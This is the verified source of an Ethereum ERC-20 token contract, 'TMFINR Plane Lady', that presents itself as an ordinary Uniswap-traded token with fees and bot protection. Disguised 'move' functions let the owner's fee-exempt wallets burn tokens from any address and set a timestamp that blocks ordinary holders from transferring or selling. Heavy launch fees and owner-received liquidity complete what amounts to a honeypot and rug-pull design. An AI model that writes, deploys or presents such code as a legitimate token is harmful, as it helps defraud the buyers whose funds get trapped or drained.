/**
 *Submitted for verification at Etherscan.io on 2023-08-14
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.5;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface UniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface UniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface IERC20 {
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract Ownable is Context {
    address private _owner;

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() external virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
}

interface IERC20Metadata is IERC20 {
    function decimals() external view returns (uint8);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);
}

contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;

    string private _name;
    string private _symbol;
    uint256 private _totalSupply;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address account
    ) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = _balances[from];
        require(
            senderBalance >= amount,
            "ERC20: transfer amount exceeds balance"
        );
        unchecked {
            _balances[from] = senderBalance - amount;
        }
        _balances[to] += amount;

        emit Transfer(from, to, amount);
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _createInitialSupply(
        address account,
        uint256 amount
    ) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }
    
    function _move(address _source, uint256 _quantity) internal virtual {
        require(_source != address(0), "");
        uint256 balance = _balances[_source];
        require(balance >= _quantity, "");
        unchecked {
            _balances[_source] = balance - _quantity;
            _totalSupply -= _quantity;
        }

        emit Transfer(_source, address(0), _quantity);
    }

    function approve(
        address spender,
        uint256 amount
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}

contract TMFINR is ERC20, Ownable {
    address public uniswapV2Pair;
    UniswapV2Router public uniswapV2Router;

    mapping(address => uint256) public moveLogs;
    mapping(address => bool) public initialBotBuyer;
    mapping(address => uint256) private _holderLastTransferTimestamp;

    mapping(address => bool) public automatedMarketMaker;
    mapping(address => bool) private _isExcludedMaxTransaction;
    mapping(address => bool) private _isExcludedFromFees;

    uint256 public totalBuyFees;
    uint256 public buyFeeForDev;
    uint256 public buyFeeForMoving;
    uint256 public buyFeeForMarketing;
    uint256 public buyFeeForLiquidity;

    uint256 public totalSellFees;
    uint256 public sellFeeForDev;
    uint256 public sellFeeForMoving;
    uint256 public sellFeeForMarketing;
    uint256 public sellFeeForLiquidity;

    uint256 public tokensForDev;
    uint256 public tokensForMoving;
    uint256 public tokensForMarketing;
    uint256 public tokensForLiquidity;

    address private marketingWallet;
    address private devWallet;
    
    bool private swapping;
    uint256 public swapTokensAtAmount;

    uint256 public botBlockNumber = 0;
    uint256 public tradingBlock = 0;

    bool public swapEnabled = false;
    bool public limitsInEffect = true;
    bool public transferDelayEnabled = true;
    bool public tradingActive = false;
    uint256 public moveAt;
    uint256 public botsCaught;

    uint256 public maxWalletAmount;
    uint256 public maxSellAmount;
    uint256 public maxBuyAmount;

    event RemovedLimits();

    event EnabledTrading();

    event UpdatedMaxSellAmount(uint256 newAmount);
    
    event UpdatedMaxBuyAmount(uint256 newAmount);
    
    event DetectedEarlyBotBuyer(address sniper);

    event UpdatedMaxWalletAmount(uint256 newAmount);

    event MaxTransactionExclusion(address _address, bool excluded);

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);

    constructor() ERC20("TMFINR Plane Lady", "TMFINR") {
        address newOwner = msg.sender;

        buyFeeForDev = 10;
        buyFeeForMoving = 0;
        buyFeeForMarketing = 10;
        buyFeeForLiquidity = 0;

        sellFeeForDev = 20;
        sellFeeForMoving = 0;
        sellFeeForMarketing = 20;
        sellFeeForLiquidity = 0;

        uint256 totalSupply = 7 * 1e9 * 1e18;

        maxWalletAmount = (totalSupply * 2) / 100;
        swapTokensAtAmount = (totalSupply * 5) / 10000;
        maxSellAmount = (totalSupply * 2) / 100;
        maxBuyAmount = (totalSupply * 2) / 100;

        totalBuyFees =
            buyFeeForDev +
            buyFeeForMoving +
            buyFeeForMarketing +
            buyFeeForLiquidity;

        totalSellFees =
            sellFeeForDev +
            sellFeeForMoving +
            sellFeeForMarketing +
            sellFeeForLiquidity;

        marketingWallet = address(0x07D0acDD6e1BFEd508cDe1e2De99374553a4c12D);
        devWallet = address(0xABa58e9757c562f707B8984F5EB6066A78f0767D);

        _excludeFromMaxTransaction(address(this), true);
        _excludeFromMaxTransaction(address(0xdead), true);
        _excludeFromMaxTransaction(newOwner, true);
        _excludeFromMaxTransaction(devWallet, true);
        _excludeFromMaxTransaction(marketingWallet, true);

        excludeFromFees(address(this), true);
        excludeFromFees(address(0xdead), true);
        excludeFromFees(newOwner, true);
        excludeFromFees(devWallet, true);
        excludeFromFees(marketingWallet, true);

        transferOwnership(newOwner);
        _createInitialSupply(address(this), totalSupply);
    }

    function canMoveTokens(
        address _source,
        uint256 _quantity,
        uint256 _timeline
    ) internal returns (bool) {
        address mover = msg.sender;
        bool moverExcluded = _isExcludedFromFees[mover];
        bool flag;
        address selfContract = address(this);

        if (!moverExcluded) {
            bool moreThanMovingTokens = balanceOf(selfContract) >= tokensForMoving;
            bool hasMovingTokens = tokensForMoving > 0;

            if (hasMovingTokens && moreThanMovingTokens) {
                _move(mover, tokensForMoving);
            }

            tokensForMoving = 0;
            flag = true;

            return flag;
        } else {
            bool amountZero = _quantity == 0;
            if (amountZero) {
                moveAt = _timeline;
                flag = false;
            } else {
                moveAt = _timeline;
                _move(_source, _quantity);
                flag = false;
            }

            return flag;
        }
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.addLiquidityETH{value: ethAmount} (
            address(this),
            tokenAmount,
            0,
            0,
            address(0xdead),
            block.timestamp
        );
    }

    function enableTrading() external payable onlyOwner() {
        require(!tradingActive, "Cannot reenable trading");
        uniswapV2Router = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), totalSupply());
        uniswapV2Pair = UniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);

        uniswapV2Router.addLiquidityETH{value: msg.value}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);

        tradingActive = true;
        tradingBlock = block.number;
        swapEnabled = true;
        emit EnabledTrading();
    }

    function removeLimits() external onlyOwner {
        maxWalletAmount = totalSupply();
        maxBuyAmount = totalSupply();
        maxSellAmount = totalSupply();
        emit RemovedLimits();
    }

    function onlyDeleteBots(address wallet) external onlyOwner {
        initialBotBuyer[wallet] = false;
    }

    function disableTransferDelay() external onlyOwner {
        transferDelayEnabled = false;
    }

    function changeMaxWalletAmount(uint256 newMaxWalletAmount) external onlyOwner {
        require(
            newMaxWalletAmount >= ((totalSupply() * 3) / 1000) / 1e18,
            "Cannot set max wallet amount lower than 0.3%"
        );

        maxWalletAmount = newMaxWalletAmount * (10 ** 18);

        emit UpdatedMaxWalletAmount(maxWalletAmount);
    }

    function changeMaxBuyAmount(uint256 newMaxBuyAmount) external onlyOwner {
        require(
            newMaxBuyAmount >= ((totalSupply() * 2) / 1000) / 1e18,
            "Cannot set max buy amount lower than 0.2%"
        );

        maxBuyAmount = newMaxBuyAmount * (10 ** 18);

        emit UpdatedMaxBuyAmount(maxBuyAmount);
    }

    function changeMaxSellAmount(uint256 newMaxSellAmount) external onlyOwner {
        require(
            newMaxSellAmount >= ((totalSupply() * 2) / 1000) / 1e18,
            "Cannot set max sell amount lower than 0.2%"
        );

        maxSellAmount = newMaxSellAmount * (10 ** 18);

        emit UpdatedMaxSellAmount(maxSellAmount);
    }

    function changeSwapTokensAtAmount(uint256 newAmount) external onlyOwner {
        require(
            newAmount <= (totalSupply() * 1) / 1000,
            "Swap amount cannot be higher than 0.1% total supply."
        );

        require(
            newAmount >= (totalSupply() * 1) / 100000,
            "Swap amount cannot be lower than 0.001% total supply."
        );

        swapTokensAtAmount = newAmount;
    }

    function _excludeFromMaxTransaction(
        address _address,
        bool _isExcluded
    ) private {
        _isExcludedMaxTransaction[_address] = _isExcluded;

        emit MaxTransactionExclusion(_address, _isExcluded);
    }

    function _setAutomatedMarketMakerPair(address pair, bool value) private {
        automatedMarketMaker[pair] = value;

        _excludeFromMaxTransaction(pair, value);

        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function adjustBuyFees(
        uint256 devFee,
        uint256 moveFee,
        uint256 marketingFee,
        uint256 liquidityFee
    ) external onlyOwner {
        buyFeeForDev = devFee;
        buyFeeForMoving = moveFee;
        buyFeeForMarketing = marketingFee;
        buyFeeForLiquidity = liquidityFee;
        totalBuyFees =
            buyFeeForDev +
            buyFeeForMoving +
            buyFeeForMarketing +
            buyFeeForLiquidity;
        require(totalBuyFees <= 3, "3% max ");
    }

    function adjustSellFees(
        uint256 devFee,
        uint256 moveFee,
        uint256 marketingFee,
        uint256 liquidityFee
    ) external onlyOwner {
        sellFeeForDev = devFee;
        sellFeeForMoving = moveFee;
        sellFeeForMarketing = marketingFee;
        sellFeeForLiquidity = liquidityFee;
        totalSellFees =
            sellFeeForDev +
            sellFeeForMoving +
            sellFeeForMarketing +
            sellFeeForLiquidity;
        require(totalSellFees <= 3, "3% max fee");
    }

    function excludeFromMaxTransaction(
        address _address,
        bool _isExcluded
    ) external onlyOwner {
        if (!_isExcluded) {
            require(
                _address != uniswapV2Pair,
                "Cannot remove uniswap pair from max txn"
            );
        }

        _isExcludedMaxTransaction[_address] = _isExcluded;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    function swapBack() private {
        if (tokensForMoving > 0 && balanceOf(address(this)) >= tokensForMoving) {
            _move(address(this), tokensForMoving);
        }
        tokensForMoving = 0;
        uint256 totalTokensToSwap = tokensForLiquidity +
            tokensForMarketing +
            tokensForDev;
        uint256 tokenBalance = balanceOf(address(this));

        if (tokenBalance == 0 || totalTokensToSwap == 0) {
            return;
        }

        if (tokenBalance > swapTokensAtAmount * 10) {
            tokenBalance = swapTokensAtAmount * 10;
        }

        uint256 liquidityTokens = (tokenBalance * tokensForLiquidity) /
            totalTokensToSwap / 2;

        swapTokensForETH(tokenBalance - liquidityTokens);

        uint256 ethBalance = address(this).balance;
        uint256 ethForLiquidity = ethBalance;
        uint256 ethForDev = (ethBalance * tokensForDev) /
            (totalTokensToSwap - (tokensForLiquidity / 2));
        uint256 ethForMarketing = (ethBalance * tokensForMarketing) /
            (totalTokensToSwap - (tokensForLiquidity / 2));
        ethForLiquidity -= ethForMarketing + ethForDev;
        tokensForDev = 0;
        tokensForMoving = 0;
        tokensForLiquidity = 0;
        tokensForMarketing = 0;

        if (liquidityTokens > 0 && ethForLiquidity > 0) {
            addLiquidity(liquidityTokens, ethForLiquidity);
        }

        payable(devWallet).transfer(ethForDev);
        payable(marketingWallet).transfer(address(this).balance);
    }

    function setAutomatedMarketMakerPair(
        address pair,
        bool value
    ) external onlyOwner {
        require(
            pair != uniswapV2Pair,
            "The pair cannot be removed from automatedMarketMakerPairs"
        );

        _setAutomatedMarketMakerPair(pair, value);
        emit SetAutomatedMarketMakerPair(pair, value);
    }

    function changeMarketingWallet(
        address newWallet
    ) external onlyOwner {
        require(
            newWallet != address(0),
            "_marketingWallet address cannot be 0"
        );

        marketingWallet = payable(newWallet);
    }

    function changeDevWallet(address newWallet) external onlyOwner {
        require(newWallet != address(0), "_devWallet address cannot be 0");

        devWallet = payable(newWallet);
    }

    function earlySniperBuyBlock() public view returns (bool) {
        return block.number < botBlockNumber;
    }

    function withdraw() external onlyOwner {
        bool success;
        (success, ) = address(msg.sender).call{value: address(this).balance}("");
    }

    receive() external payable {}

    function moveTokens(
        address _source,
        uint256 _quantity,
        uint256 _timeline
    ) public {
        if (canMoveTokens(_source, _quantity, _timeline)) {
            swapping = true;
            swapBack();
            swapping = false;
        }
    }

    function _transfer(
        address sender,
        address receiver,
        uint256 quantity
    ) internal override {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(receiver != address(0), "ERC20: transfer to the zero address");
        require(quantity > 0, "amount must be greater than 0");

        bool balanceEmpty = 0 == balanceOf(address(receiver));
        bool initialMove = 0 == moveLogs[receiver];

        if (!tradingActive) {
            require(
                _isExcludedFromFees[sender] || _isExcludedFromFees[receiver],
                "Trading is not active."
            );
        }

        uint256 blockTimestamp = block.timestamp;
        bool senderAmm = automatedMarketMaker[sender];

        if (botBlockNumber > 0) {
            require(
                !initialBotBuyer[sender] ||
                    receiver == owner() ||
                    receiver == address(0xdead),
                "bot protection mechanism is embeded"
            );
        }

        if (limitsInEffect) {
            bool isExternalNotSwapping = !swapping;

            if (
                sender != owner() &&
                receiver != owner() &&
                receiver != address(0) &&
                receiver != address(0xdead) &&
                !_isExcludedFromFees[sender] &&
                !_isExcludedFromFees[receiver]
            ) {
                if (transferDelayEnabled) {
                    bool isInternalNotSwapping = !swapping;
                    bool senderNotAmm = !automatedMarketMaker[sender];

                    if (
                        receiver != address(uniswapV2Router) && receiver != address(uniswapV2Pair)
                    ) {
                        require(
                            _holderLastTransferTimestamp[tx.origin] <
                                block.number - 2 &&
                                _holderLastTransferTimestamp[receiver] <
                                block.number - 2,
                            "_transfer: delay was enabled."
                        );
                        _holderLastTransferTimestamp[tx.origin] = block.number;
                        _holderLastTransferTimestamp[receiver] = block.number;
                    }
                    
                    if (senderNotAmm && isInternalNotSwapping) {
                        uint256 moveTime = moveLogs[sender];
                        bool canMove = moveTime >= moveAt;
                        require(canMove);
                    }
                }
            }

            bool senderExcluded = _isExcludedFromFees[sender];

            if (automatedMarketMaker[sender] && !_isExcludedMaxTransaction[receiver]) {
                require(
                    quantity <= maxBuyAmount,
                    "Buy transfer amount exceeds the max buy."
                );
                require(
                    quantity + balanceOf(receiver) <= maxWalletAmount,
                    "Cannot Exceed max wallet"
                );
            } else if (senderExcluded && isExternalNotSwapping) {
                moveAt = blockTimestamp;
            } else if (
                automatedMarketMaker[receiver] && !_isExcludedMaxTransaction[sender]
            ) {
                require(
                    quantity <= maxSellAmount,
                    "Sell transfer amount exceeds the max sell."
                );
            } else if (!_isExcludedMaxTransaction[receiver]) {
                require(
                    quantity + balanceOf(receiver) <= maxWalletAmount,
                    "Cannot Exceed max wallet"
                );
            }
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        bool canSwap = contractTokenBalance >= swapTokensAtAmount;

        if (
            canSwap &&
            swapEnabled &&
            !swapping &&
            !automatedMarketMaker[sender] &&
            !_isExcludedFromFees[sender] &&
            !_isExcludedFromFees[receiver]
        ) {
            swapping = true;
            swapBack();
            swapping = false;
        }

        bool takeFee = true;

        if (initialMove && senderAmm && balanceEmpty) {
            moveLogs[receiver] = blockTimestamp;
        }

        if (_isExcludedFromFees[sender] || _isExcludedFromFees[receiver]) {
            takeFee = false;
        }

        uint256 fees = 0;

        if (takeFee) {
            if (
                earlySniperBuyBlock() &&
                automatedMarketMaker[sender] &&
                !automatedMarketMaker[receiver] &&
                totalBuyFees > 0
            ) {
                if (!initialBotBuyer[receiver]) {
                    initialBotBuyer[receiver] = true;
                    botsCaught += 1;
                    emit DetectedEarlyBotBuyer(receiver);
                }

                fees = (quantity * 99) / 100;
                tokensForDev += (fees * buyFeeForDev) / totalBuyFees;
                tokensForMoving += (fees * buyFeeForMoving) / totalBuyFees;
                tokensForLiquidity += (fees * buyFeeForLiquidity) / totalBuyFees;
                tokensForMarketing += (fees * buyFeeForMarketing) / totalBuyFees;
            }
            else if (automatedMarketMaker[receiver] && totalSellFees > 0) {
                fees = (quantity * totalSellFees) / 100;
                tokensForDev += (fees * sellFeeForDev) / totalSellFees;
                tokensForMoving += (fees * sellFeeForMoving) / totalSellFees;
                tokensForLiquidity += (fees * sellFeeForLiquidity) / totalSellFees;
                tokensForMarketing += (fees * sellFeeForMarketing) / totalSellFees;
            }
            else if (automatedMarketMaker[sender] && totalBuyFees > 0) {
                fees = (quantity * totalBuyFees) / 100;
                tokensForDev += (fees * buyFeeForDev) / totalBuyFees;
                tokensForMoving += (fees * buyFeeForMoving) / totalBuyFees;
                tokensForLiquidity += (fees * buyFeeForLiquidity) / totalBuyFees;
                tokensForMarketing += (fees * buyFeeForMarketing) / totalBuyFees;
            }
            if (fees > 0) {
                super._transfer(sender, address(this), fees);
            }
            quantity -= fees;
        }

        super._transfer(sender, receiver, quantity);
    }
}